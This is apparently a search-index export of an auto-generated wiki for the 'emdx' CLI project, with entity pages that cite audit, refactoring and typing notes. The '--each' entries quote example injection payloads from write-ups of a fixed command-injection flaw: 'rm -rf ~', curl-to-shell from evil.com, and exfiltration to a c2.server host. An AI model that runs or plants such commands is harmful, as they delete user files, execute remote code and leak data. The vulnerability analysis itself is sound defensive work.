(4 shared docs, PMI=5.8)</li> </ul>"},{"location":"entities/each-rm-rf/","title":"--each \"; rm -rf ~\"","text":"<p>Type: tech_term | Mentioned in: 10 documents | First seen: 2026-02-14</p>"},{"location":"entities/each-rm-rf/#documents-10","title":"Documents (10)","text":"<ul> <li>#6468 Security Fix Implementation for EMDX Delegate Command   Section: Vulnerability Details <p>Attack Vectors:</p> </li> <li><code>--each \"; rm -rf ~\"</code> - Command chaining to delete files</li> <li><code>--each \"$(curl evil.com | sh)\"</code> - Command substitution for remote code execution</li> <li> <p>`--each \"fd &amp;&amp; curl http://c2.server/exfil?...</p> </li> <li> <p>#6272 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [36/37]   Section: Vulnerability Details</p> <p>This allowed arbitrary command execution:</p> </li> <li><code>--each \"; rm -rf ~\"</code> - Command chaining</li> <li><code>--each \"$(curl evil.com | sh)\"</code> - Command substitution</li> <li> <p><code>--each \"fd &amp;&amp; curl http://c2.server/exfil?$(whoami)\"</code> - Data exfiltration</p> </li> <li> <p>#6267 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [32/37]   Section: The Vulnerability</p> <p>This allowed arbitrary command execution via:</p> </li> <li><code>--each \"; rm -rf ~\"</code> </li> <li> <p><code>--each \"curl https://evil.com/script.sh | sh\"</code></p> </li> <li> <p>#6265 Delegate: Document #6230 - Security Fix Implementation   Section: Vulnerability Details</p> <p>Impact: A malicious command like <code>--each \"; rm -rf ~\"</code> could execute arbitrary shell commands.</p> </li> <li> <p>#6258 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [24/37]   Section: Summary</p> <p>A malicious <code>--each</code> argument like <code>--each \"; rm -rf ~\"</code> could execute arbitrary commands.</p> </li> <li> <p>#6257 Delegate: Document #6230 (Security Fix Implementation)   Section: Issue</p> <p>This allowed injection attacks like <code>--each \"; rm -rf ~\"</code>.</p> </li> <li> <p>#6254 Delegate: Fix command injection in --each discovery   Section: The Vulnerability</p> <p>This allowed arbitrary command execution via the <code>--each</code> flag:</p> </li> <li><code>--each \"; rm -rf ~\"</code> - shell metacharacter injection</li> <li><code>--each \"fd | malicious\"</code> - pipe injection  </li> <li> <p><code>--each \"\\$(evil)\"</code> - command substitution</p> </li> <li> <p>#6251 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [16/37]   Section: Summary</p> <p>A malicious command like <code>--each \"; rm -rf ~\"</code> could execute arbitrary shell commands.</p> </li> <li> <p>#6243 Delegate: Fix command injection in --each flag   Section: The Vulnerability</p> <p>This allowed command injection attacks like:</p> </li> <li><code>--each \"; rm -rf ~\"</code></li> <li> <p><code>--each \"fd; curl http://evil.com | bash\"</code></p> </li> <li> <p>#6230 Delegate: Audit SECURITY DEBT in the emdx project: Check for SQL injec [5/14]   Section: Findings</p> <p>Issue: The <code>--each</code> flag passes user input directly to a shell via <code>shell=True</code>. A malicious command like <code>--each \"; rm -rf ~\"</code> could execute arbitrary commands.</p> </li> </ul>"},{"location":"entities/each-rm-rf/#related-entities","title":"Related Entities","text":"<ul> <li><code>curl</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.4)</li> <li><code>git ls-files</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.4)</li> <li><code>bash</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.4)</li> <li><code>rg -l</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>pr #510</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>find . -name '*.py'</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>fd -e py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>complete</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>the vulnerability</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.1)</li> <li><code>fix implementation</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> </ul>"},{"location":"entities/each/","title":"--each","text":"<p>Type: tech_term | Mentioned in: 33 documents | First seen: 2026-02-14</p>"},{"location":"entities/each/#documents-33","title":"Documents (33)","text":"<ul> <li> <p>#6728 Wiki Generation Architecture Research [6/10]   Section: Recommendation: Three-Tier Scoring with Noise Filtering</p> <p>....py<code>| | FUNC_CALL | 53 |</code>_run_discovery()<code>,</code>shlex.split()<code>| | CLI_FLAG | 27 |</code>--each<code>,</code>--json<code>| | SUMMARY_NOISE | 12 |</code>summary fixed<code>,</code>summary added<code>| | TYPE_ANNOT | 8 |</code>dict[str, any]<code>,</code>list[dict[str, any]]` |</p> </li> <li> <p>#6608 Delegate: Remove the --each/--do dynamic discovery feature from emdx d   Section: Summary</p> <p>Removed the <code>--each</code>/<code>--do</code> dynamic discovery feature from <code>emdx delegate</code>. This feature allowed running a shell command to discover items at runtime and then dispatching a delegate tas...</p> </li> <li> <p>#6567 Delegate synthesis [synthesis]   Section: 2. Execution Modes</p> <p>Dynamic Discovery: <code>--each</code> + <code>--do</code> pattern enables batch processing via shell command discovery (allowlisted commands only).</p> </li> <li> <p>#6564 Delegate: Analyze the emdx delegate command implementation in emdx/com [1/3]   Section: Dynamic Discovery</p> Flag Short Description <code>--each</code> \u2014 Shell command to discover items (one per line) <code>--do</code> \u2014 Template for each discovered item (use <code>{{item}}</code>) </li> <li> <p>#6469 Centralized Configuration Constants for EMDX   Section: Timeout Values</p> <p>..._COMMAND_TIMEOUT<code>/</code>DISCOVERY_TIMEOUT_SECONDS<code>| 30s | Shell discovery commands (</code>--each<code>) | |</code>GITHUB_AUTH_TIMEOUT<code>| 10s |</code>gh auth token<code>retrieval | |</code>PROCESS_TERMINATE_TIMEOUT<code>| 3s | Graceful termination wait | |</code>PROCESS_KILL_TIMEOUT` | 1s | Forc...</p> </li> <li> <p>#6468 Security Fix Implementation for EMDX Delegate Command   Section: Summary</p> <p>Successfully implemented a critical security fix for a command injection vulnerability in the <code>emdx delegate --each</code> flag. The vulnerability allowed arbitrary command execution through unsanitized shell commands, posing a severe security risk.</p> </li> <li> <p>#6465 Security Audit and Fixes: EMDX Command Injection Vulnerability   Section: Executive Summary</p> <p>...project identified a critical command injection vulnerability in the <code>delegate --each</code> feature. This vulnerability allowed arbitrary command execution through shell injection and has been successfully remediated through multiple security fixes.</p> </li> <li> <p>#6395 Delegate: Analyze how EMDX is used differently by humans vs AI agents. [1/3]   Section: 6. WORKFLOW DIFFERENCES</p> <p>...acks executions</p> </li> <li>Handles parallel (<code>-j</code>), sequential (<code>--chain</code>), and discovery (<code>--each</code>)</li> <li>Creates PRs (<code>--pr</code>), uses worktrees (<code>--worktree</code>)</li> <li> <p>Key insight: Agents are invoked by delegate, not running interactively</p> </li> <li> <p>#6378 Codebase Bug Audit 2026-02-15 [9/10]   Section: CRITICAL Issues (0 Found)</p> <p>No critical, exploitable vulnerabilities found. Previous command injection in delegate <code>--each</code> was already fixed (Document #6241).</p> </li> <li> <p>#6283 Delegate synthesis [synthesis]   Section: 1. CRITICAL Security Vulnerability Fixed (PR #484, #494)</p> <p>Command Injection in <code>delegate --each</code> - The most severe finding:</p> </li> <li><code>subprocess.run(command, shell=True)</code> allowed arbitrary command execution</li> <li> <p>Fix: Command allowlist + <code>shlex.split()</code> + <code>shell=False</code>...</p> </li> <li> <p>#6276 Delegate: DEBT-1: Fix command injection vulnerability in emdx/commands   Section: Summary</p> <p>Fixed a command injection vulnerability (DEBT-1) in <code>emdx/commands/delegate.py</code> where the <code>_run_discovery()</code> function used <code>shell=True</code> with user input from the <code>--each</code> flag, enabling arbitrary command execution.</p> </li> <li> <p>#6269 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [25/37]   Section: 1. New Timeout Constants in <code>emdx/config/constants.py</code></p> <p>...on verification | | <code>DISCOVERY_COMMAND_TIMEOUT</code> | 30s | Shell discovery commands (<code>--each</code>) | | <code>GITHUB_AUTH_TIMEOUT</code> | 10s | <code>gh auth token</code> retrieval | | <code>PROCESS_TERMINATE_TIMEOUT</code> | 3s | Graceful termination wait | | <code>PROCESS_KILL_TIMEOUT</code> | 1s | Forc...</p> </li> <li> <p>#6267 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [32/37]   Section: The Vulnerability</p> <p>The <code>--each</code> flag passed user input directly to <code>subprocess.run()</code> with <code>shell=True</code>:</p> </li> <li> <p>#6265 Delegate: Document #6230 - Security Fix Implementation   Section: Vulnerability Details</p> <p>Issue: The <code>--each</code> flag passed user input directly to <code>subprocess.run()</code> with <code>shell=True</code>, allowing arbitrary command execution:</p> </li> <li> <p>#6263 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [28/37]   Section: Summary</p> <p>Fixed the critical command injection vulnerability identified in the security audit. The <code>--each</code> flag in <code>emdx delegate</code> previously passed user input directly to a shell subprocess (<code>shell=True</code>), enabling arbitrary command execution.</p> </li> <li> <p>#6262 Delegate: Audit API/INTERFACE DEBT in the emdx CLI [3/14]   Section: Changes Made</p> </li> <li>Updated <code>--each</code> help: \"Shell command to discover items (one per line). Use with --do to specify a template.\"</li> <li> <p>Updated <code>--do</code> help: \"Template for --each items. Use {{item}} as plac...</p> </li> <li> <p>#6260 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [26/37]   Section: Vulnerability</p> <p>The <code>_run_discovery()</code> function in <code>emdx/commands/delegate.py</code> was using <code>shell=True</code> with user input from the <code>--each</code> flag:</p> </li> <li> <p>#6258 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [24/37]   Section: Summary</p> <p>Fixed a critical command injection vulnerability in the <code>emdx delegate --each</code> feature.</p> </li> <li> <p>#6255 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [20/37]   Section: Summary</p> <p>Fixed a HIGH severity command injection vulnerability in the <code>delegate --each</code> flag, identified in Security Audit Document #6230.</p> </li> <li> <p>#6253 Delegate: Fix command injection vulnerability in delegate --each   Section: Summary</p> <p>Fixed a CRITICAL command injection vulnerability in the <code>delegate --each</code> feature identified in Document #6230 (Security Audit).</p> </li> <li> <p>#6251 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [16/37]   Section: Summary</p> </li> <li> <p>#6243 Delegate: Fix command injection in --each flag   Section: Summary</p> <p>Fixed a CRITICAL command injection vulnerability in <code>emdx/commands/delegate.py</code> where the <code>--each</code> flag passed user input directly to a shell via <code>subprocess.run(command, shell=True)</code>.</p> </li> <li> <p>#6242 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [8/37]   Section: Summary</p> <p>Fixed CRITICAL command injection vulnerability in <code>emdx delegate --each</code> feature.</p> </li> <li> <p>#6241 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [10/37]   Section: Vulnerability Details</p> <p>Location: <code>emdx/commands/delegate.py:144</code> (<code>_run_discovery()</code> function) Severity: HIGH Issue: The <code>--each</code> flag passed user input directly to a shell via <code>shell=True</code>, allowing command injection attacks.</p> </li> <li> <p>#6240 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [4/37]   Section: Summary</p> <p>Fixed critical command injection vulnerability in <code>emdx delegate --each</code> identified in document #6230 (Security Audit Report).</p> </li> <li> <p>#6238 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [6/37]   Section: Security Fix: Command Injection in Delegate Discovery</p> <p>Issue: CRITICAL - The <code>--each</code> flag in <code>emdx delegate</code> was vulnerable to command injection due to using <code>shell=True</code> with user-provided input.</p> </li> <li> <p>#6237 Delegate synthesis [synthesis]   Section: Critical Findings (Immediate Action Required)</p> <p>...n:** <code>emdx/commands/delegate.py:144</code></p> </li> <li>Issue: <code>shell=True</code> with user input in <code>--each</code> flag enables arbitrary command execution</li> <li> <p>Fix: Validate/restrict commands or use <code>shlex.split()</code> with <code>shell=False</code></p> </li> <li> <p>#6230 Delegate: Audit SECURITY DEBT in the emdx project: Check for SQL injec [5/14]   Section: Findings</p> <p>Issue: The <code>--each</code> flag passes user input directly to a shell via <code>shell=True</code>. A malicious command like <code>--each \"; rm -rf ~\"</code> could execute arbitrary commands.</p> </li> <li> <p>#6226 Delegate: Audit API/INTERFACE DEBT in the emdx CLI: Check all CLI comm [3/14]   Section: MEDIUM SEVERITY (Help/Documentation)</p> </li> <li> <p>#6221 Delegate: Audit SECURITY DEBT in the emdx project: Check for SQL injec [5/14]   Section: 1. COMMAND INJECTION - HIGH SEVERITY</p> <p>Risk: The <code>--each</code> option accepts arbitrary shell commands from users and executes them with <code>shell=True</code>. An attacker could inject malicious commands.</p> </li> </ul>"},{"location":"entities/each/#3-documented-item-syntax-in-help-text-issue-10","title":"3. Documented {{item}} Syntax in Help Text (Issue #10)","text":""},{"location":"entities/each/#the-vulnerability","title":"The Vulnerability","text":"<p>The <code>--each</code> flag in <code>emdx delegate</code> passed user input directly to <code>subprocess.run()</code> with <code>shell=True</code>:</p>"},{"location":"entities/each/#10-undocumented-behaviors","title":"10. Undocumented Behaviors","text":"<p>Location: <code>delegate.py</code> Issue: <code>--each</code> requires <code>--do</code> but help doesn't explain template syntax (<code>{{item}}</code>). Impact: Users discover <code>{{item}}</code> by trial and error. Recommendation: Add examples to...</p>"},{"location":"entities/each/#related-entities","title":"Related Entities","text":"<ul> <li><code>locate</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=4.7)</li> <li><code>before (vulnerable)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=4.7)</li> <li><code>the vulnerability</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=4.7)</li> <li><code>overall security posture</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=4.7)</li> <li><code>head</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=4.7)</li> <li><code>delegate --each</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=4.7)</li> <li><code>before (vulnerable):</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=4.7)</li> <li><code>after (secure)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=4.7)</li> <li><code>--do</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=4.7)</li> <li><code>vulnerability</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.7)</li> </ul>"},{"location":"entities/embeddingservice/","title":"embeddingservice","text":"<p>Type: tech_term | Mentioned in: 10 documents | First seen: 2026-02-14</p>"},{"location":"entities/embeddingservice/#documents-10","title":"Documents (10)","text":"<ul> <li>#6584 Delegate: Add missing all exports to emdx/services/cli_executor/__ [1/2]   Section: Symbols NOT Added (and why) <ul> <li><code>EmbeddingService</code> \u2014 requires numpy (optional dep), lazy-loaded pattern</li> </ul> </li> <li><code>ExecutionMonitor</code> \u2014 requires psutil, lazy-loaded in tests</li> <li> <p>**<code>HybridSearchService</code>, `UnifiedSearchSer...</p> </li> <li> <p>#6581 Delegate: Audit emdx/ui/ for methods with Any-typed parameters that co [2/3]   Section: 4. <code>qa/qa_presenter.py:75,99</code> \u2014 <code>_embedding_service: Any</code> / <code>_get_embedding_service() -&gt; Any</code></p> <p>Lazily-loaded <code>EmbeddingService</code>. Use <code>TYPE_CHECKING</code> guard.</p> </li> <li> <p>#6516 Any removal Phase 4: Command/Model TypedDicts   Section: 3. <code>emdx/services/unified_search.py</code></p> <p>Changes:</p> </li> <li>Added <code>TYPE_CHECKING</code> guard for <code>EmbeddingService</code> and <code>SemanticMatch</code> imports</li> <li>Created <code>FuzzyMatchDoc</code> TypedDict for fuzzy search results:</li> <li> <p><code>id: int</code>, <code>title: str</code>, <code>project: str | None</code>, `created_at: str | Non...</p> </li> <li> <p>#6509 Any Type Removal Analysis [synthesis]   Section: Common Themes</p> </li> <li><code>anthropic.Anthropic</code></li> <li><code>SentenceTransformer</code></li> <li><code>EmbeddingService</code></li> <li> <p><code>watchdog.Observer</code></p> </li> <li> <p>#6490 Any Type Removal Analysis [4/5]   Section: 2. <code>_embedding_service</code> instance variable (Line 45)</p> <p>Recommended:</p> </li> </ul> <pre><code>from typing import TYPE_CHECKING\nif TYPE_CHECKING:\n    from .embedding_service import EmbeddingService\n\n- **#6484** Any Type Removal Analysis [4/5]\n  *Section: File: `emdx/services/ask_service.py`*\n  &gt; **Recommended Type:**\n```python\nself._client: anthropic.Anthropic | None = None\nself._embedding_service: EmbeddingService | None = None\n</code></pre> <ul> <li>#6327 Delegate: analysis,architecture [7/10]   Section: Strengths </li> <li><code>UnifiedExecutor</code> abstracts Claude/Cursor differences</li> <li><code>EmbeddingService</code> handles semantic search</li> <li> <p><code>AskService</code> provides AI Q&amp;A interface</p> </li> <li> <p>#6308 Delegate: Analyze API SURFACE &amp; CONCISENESS across emdx/ (exclude ui/  [10/15]   Section: 6. Service Interface Analysis</p> <p>Well-designed services:</p> </li> <li><code>UnifiedExecutor</code> - clean single interface for all execution</li> <li><code>EmbeddingService</code> - simple CRUD + search</li> <li> <p><code>AskService</code> - focused RAG implementation</p> </li> <li> <p>#6304 Delegate: Analyze NAMING &amp; CLARITY across emdx/ (exclude ui/ and tests [1/15]   Section: <code>*_service</code> vs <code>*Service</code> Class Names</p> <p>...ased | <code>UnifiedSearchService</code> | <code>services/unified_search.py:54</code> | | Class-based | <code>EmbeddingService</code> | <code>services/embedding_service.py</code> | | Module functions | <code>tag_service.py</code> | <code>services/tag_service.py</code> (re-exports only) |</p> </li> <li> <p>#6233 Delegate: Dead Code Audit - emdx Project [2/14]   Section: 6. DUPLICATE IMPORTS (Code Quality)</p> <p>...<code>psutil</code>, <code>ExecutionMonitor</code></p> </li> <li><code>emdx/commands/ask.py</code> - Duplicates: <code>AskService</code>, <code>EmbeddingService</code> (5x)</li> <li><code>emdx/commands/maintain.py</code> - Duplicates: <code>Progress</code>, <code>SpinnerColumn</code>, <code>TextColumn</code>, <code>psutil</code>, <code>get_running_executions</code></li> <li><code>emdx/commands/delegate.py</code> - Dupli...</li> </ul>"},{"location":"entities/embeddingservice/#2-optional-dependency-types-high-priority","title":"2. Optional Dependency Types (High Priority)","text":"<p>Services use <code>Any</code> for lazily-loaded optional dependencies:</p>"},{"location":"entities/embeddingservice/#4-service-abstraction-for-ai-features","title":"4. Service Abstraction for AI Features","text":""},{"location":"entities/embeddingservice/#related-entities","title":"Related Entities","text":"<ul> <li><code>similardocument</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>matches</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>indexstats</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>get_cli_executor</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>executionmonitor</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>askservice</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.8)</li> <li><code>watchdog.observer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>tag_service</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>semanticmatch</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>searchquery</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> </ul>"},{"location":"entities/embeddingservicepy/","title":"embedding_service.py","text":"<p>Type: heading | Mentioned in: 9 documents | First seen: 2026-02-13</p>"},{"location":"entities/embeddingservicepy/#documents-9","title":"Documents (9)","text":"<ul> <li> <p>#6434 Any/None typing audit [4/5]</p> <p>| Suggested Replacement | |----------|--------------|--------------|----------------------| | <code>_embedding_service</code> | Attr typed <code>Any</code> | \u2705 Yes | <code>EmbeddingService \\| None</code> (lazy import pattern ok) | | <code>embedding_service</code> property | Returns <code>Any</code> | \u2705 Y...</p> </li> <li> <p>#6873 Delegate: Document #6864 (Delegate synthesis [synthesis]):</p> </li> </ul>"},{"location":"entities/embeddingservicepy/#synthes-14","title":"Synthes [1/4]","text":"<p>Section: Functions with ZERO Callers Outside Their Own File</p> <p>...icate_detector.py<code>|</code>find_similar_titles<code>| **NO** | no | *nowhere* | |</code>services/embedding_service.py<code>|</code>delete_embedding<code>| **NO** | no | *nowhere* | |</code>services/embedding_service.py<code>|</code>delete_chunk_embeddings<code>| **NO** | no | *nowhere* | |</code>services/embedding_ser...</p> <ul> <li> <p>#6484 Any Type Removal Analysis [4/5]   Section: File: <code>emdx/services/unified_search.py</code></p> <p>Why: <code>matches</code> comes from <code>embedding_service.search()</code> which returns <code>list[SemanticMatch]</code> (see <code>embedding_service.py</code> line 241).</p> </li> <li> <p>#6326 Delegate: Analyze emdx/services/ for architecture improvements. Focus  [2/10]   Section: Overlapping/Unclear Boundaries \u26a0\ufe0f</p> <p>...--| | <code>unified_search.py:1-587</code> | 587 | FTS5 + tags + semantic + fuzzy search | | <code>embedding_service.py:1-371</code> | 371 | Vector embeddings + semantic search | | <code>similarity.py:1-584</code> | 584 | TF-IDF similarity |</p> </li> <li> <p>#6234 Delegate: Tech Debt Category Audit 2026-02-14 [14/14]   Section: CATEGORY 4: Import &amp; Dependency Patterns</p> </li> <li>18 files with ImportError fallbacks - creates runtime None-checks</li> <li>Affects: <code>similarity.py</code>, <code>embedding_service.py</code>, <code>ask_service.py</code>, various UI files</li> <li> <p>Pattern: <code>try: import X except ImportError: X = None</code></p> </li> <li> <p>#6229 Delegate: Audit DEPENDENCY DEBT in the emdx project: Check pyproject.t [1/14]   Section: Well-Designed Patterns Found \u2713</p> <p>...lpful error messages</p> </li> <li>Graceful degradation - Services like <code>similarity.py</code>, <code>embedding_service.py</code>, <code>duplicate_detector.py</code> all use <code>try/except ImportError</code> with <code>HAS_*</code> flags</li> <li> <p>Grouped extras - <code>[ai]</code>, <code>[similarity]</code>, <code>[google]</code>, <code>[all]</code> extras are well-org...</p> </li> <li> <p>#6152 PR Review: #454 Semantic Find Upgrade   Section: Issues \ud83d\udea8</p> </li> <li><code>chunk_splitter.py</code> (323 lines) - untested</li> <li><code>hybrid_search.py</code> (349 lines) - untested</li> <li> <p>Chunk indexing in <code>embedding_service.py</code> - untested</p> </li> <li> <p>#6511 None Type Analysis [synthesis]   Section: File-by-File Summary</p> <p>...thesis_service.py**: All 2 necessary</p> </li> <li>document_merger.py: All 5 necessary</li> <li>embedding_service.py: All 1 necessary</li> <li>log_stream.py: All 1 necessary</li> <li>health_monitor.py: All 2 necessary</li> <li>duplicate_detector.py: All 2 necessary</li> <li> <p>*cascade_service.py...</p> </li> <li> <p>#6497 None Type Analysis [6/7]   Section: TRULY UNNECESSARY <code>| None</code> Annotations Found</p> </li> </ul> <pre><code>def _get_cached_embedding(self, doc_id: int) -&gt; np.ndarray | None:\n</code></pre> <p>Verdict: NECESSARY \u2014 Returns <code>None</code> when no cache hit.</p>"},{"location":"entities/embeddingservicepy/#import-complexity","title":"Import Complexity","text":""},{"location":"entities/embeddingservicepy/#2-no-unit-tests-for-new-code","title":"2. No Unit Tests for New Code","text":"<p>The PR adds ~650 lines of new code but no tests:</p>"},{"location":"entities/embeddingservicepy/#2-embedding_servicepy137-_get_cached_embedding-return","title":"2. <code>embedding_service.py:137</code> \u2014 <code>_get_cached_embedding</code> return","text":""},{"location":"entities/embeddingservicepy/#related-entities","title":"Related Entities","text":"<ul> <li><code>execution_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.6)</li> <li><code>hybrid_search.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>find_all_duplicate_pairs</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>code organization</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>cli_executor/cursor.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>calculate_overall_health()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>cli_executor/factory.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>cli_executor/claude.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>file_watcher.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.0)</li> <li><code>services/claude_executor.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> </ul>"},{"location":"entities/emdx-ai-index/","title":"emdx ai index","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-02-13</p>"},{"location":"entities/emdx-ai-index/#documents-8","title":"Documents (8)","text":"<ul> <li> <p>#6519 Delegate: Analyze FEAT-7: Re-implement ask-kb improvements (PR #453).  [2/2]   Section: <code>emdx/commands/ask.py</code> (Current State)</p> <p>...bose<code>debug mode | \u2705 Exists | |</code>emdx ai context<code>(pipe to claude) | \u2705 Exists | |</code>emdx ai index<code>(build embeddings) | \u2705 Exists | |</code>emdx ai search<code>(semantic search) | \u2705 Exists | |</code>emdx ai similar<code>(find similar docs) | \u2705 Exists | |</code>emdx ai stats<code>,</code>emdx ai c...</p> </li> <li> <p>#6441 Delegate: Update docs/ai-system.md: The semantic search system now has [2/3]   Section: Changes Made</p> <ol> <li>Command Documentation:</li> </ol> </li> <li>Updated <code>emdx ai index</code> to note it indexes both docs and chunks by default</li> <li> <p>Added <code>--no-chunks</code> option for document-only indexing</p> </li> <li> <p>#6222 